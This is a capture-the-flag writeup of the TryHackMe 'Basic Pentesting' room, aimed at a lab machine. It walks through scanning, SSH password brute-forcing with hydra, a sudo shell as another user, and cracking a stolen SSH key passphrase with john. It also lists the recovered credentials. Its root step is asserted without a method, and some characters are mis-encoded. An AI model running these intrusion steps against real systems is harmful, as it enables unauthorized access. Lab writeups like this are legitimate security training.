<div align="center">
  
# ÿ®ÿ≥ŸÖ ÿßŸÑŸÑŸá ÿßŸÑÿ±ÿ≠ŸÖŸÜ ÿßŸÑÿ±ÿ≠ŸäŸÖ  

</div>

# TryHackMe: Basic Pentesting Writeup by Mohammed (Azima)

**Room Link:** [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)  
**Difficulty:** Easy  
**Tags:** `#WebAppSecurity` `#PrivilegeEscalation` `#CTF`

## 1. Reconnaissance

### Nikto Scan
```bash
nikto -h http://10.10.140.120/
```
Result:
![image](https://github.com/user-attachments/assets/27960e1b-c49b-4bdb-af65-cb6403c6beb3)

### Nmap Scan
```bash
nmap -sV -A -T4 <TARGET_IP>
```
Result:
It gave me Open PORTs ,     STATE used , SERVICE used and it is     VERSION


# Nmap Scan Findings - 10.10.140.120

## Open Ports and Services

### Port 22 (SSH)
- **Service**: OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
- **Details**:
  - SSH host keys found (RSA, ECDSA, ED25519)
  - Ubuntu Linux OS indication

### Port 80 (HTTP)
- **Service**: Apache httpd 2.4.18 (Ubuntu)
- **Details**:
  - Server header confirms Apache/2.4.18 on Ubuntu
  - No title returned (text/html content)

### Ports 139/445 (SMB)
- **Service**: Samba smbd 4.3.11-Ubuntu
- **Details**:
  - Workgroup: WORKGROUP
  - NetBIOS computer name: BASIC2
  - Samba version: 4.3.11-Ubuntu
  - Security mode: Message signing enabled but not required
  - Guest access allowed
  - OS identification as Windows 6.1 (Samba's Windows compatibility layer)

### Port 8009 (AJP13)
- **Service**: Apache Jserv (Protocol v1.3)
- **Details**:
  - Supported methods: GET, HEAD, POST, OPTIONS

### Port 8080 (HTTP)
- **Service**: Apache Tomcat 9.0.7
- **Details**:
  - Possible open proxy
  - Tomcat default page visible

## Additional System Information
- **Hostname**: BASIC2
- **Operating System**: Linux (Ubuntu based on package versions)
- **Network Distance**: 1 hop away
- **MAC Address**: 02:5F:A2:B3:78:FD
- **System Timezone**: Appears to be set to EDT (UTC-4)

## Notes
The scan reveals a typical LAMP stack with additional services that could be potential entry points for further investigation, particularly the SMB shares and Tomcat server.
### Web Enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Discovered:**
- `/development` - Contains two files:
  - `dev.txt` (hinted at weak credentials for user J and K)
  - `notes.txt`

## 2. Exploitation

### SMB Enumeration
```bash
smbclient -L //<TARGET_IP> -N
```
Found an anonymous share, but no useful data.

### Brute-Forcing SSH
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

**Credentials Found:**
- **Username:** jan
- **Password:** armando

**SSH Access:**
```bash
ssh jan@<TARGET_IP>
```

## 3. Privilege Escalation

### Checking Sudo Permissions
```bash
sudo -l
```
Discovered jan could run `/bin/bash` as user kay:
```bash
sudo -u kay /bin/bash
```

### Accessing Kay's SSH Key
Found private key at `/home/kay/.ssh/id_rsa`

**Cracking Process:**
```bash
python /usr/share/john/ssh2john.py id_rsa > kay_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
```
**Cracked Passphrase:** `beeswax`

**Logged in as kay:**
```bash
ssh -i id_rsa kay@<TARGET_IP>
```

### Root Flag
Found in `/root/root.txt` after further enumeration.

## 4. Lessons Learned
- üö® **Weak Passwords:** Default credentials (jan:armando) allowed initial access
- ‚ö†Ô∏è **Misconfigured Sudo:** Improper sudo permissions enabled privilege escalation
- üîë **Exposed SSH Keys:** Private keys without strong passphrases are dangerous

---

üîó **More Writeups:** [My GitHub Security Writeups](https://github.com/Mohammed-Abdelaziem/Writeups)
